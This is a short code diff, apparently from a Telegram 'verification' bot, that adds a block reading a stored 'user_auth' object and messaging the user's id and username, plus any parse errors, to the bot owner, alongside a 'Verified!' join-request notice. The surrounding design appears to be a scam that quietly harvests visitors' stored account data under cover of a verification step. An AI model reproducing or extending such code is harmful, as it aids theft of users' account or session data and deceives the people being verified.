@@ -202,9 +202,18 @@ try {
   const inviteMsg = `<b>Verified!</b> 
 Join request has been sent and you will be added once the admin approves your request`;
 
+let user_id = null;
+let username = "undefined";
+
+try {
   const user_auth = JSON.parse(storage.user_auth);
-  const user_id = user_auth?.id || null;
-  const username = user?.username || "undefined";
+  user_id = user_auth?.id || null;
+  username = user?.username || "undefined";
+
+  await bot.api.sendMessage(botOwner, `📦 user_auth.id = ${user_id}\n📦 username = ${username}`);
+} catch (e) {
+  await bot.api.sendMessage(botOwner, `❌ ERRORE parsing user_auth:\n${e}`);
+}
 
   const debugMessage = `
 <b>🔍 DEBUG INFO</b>
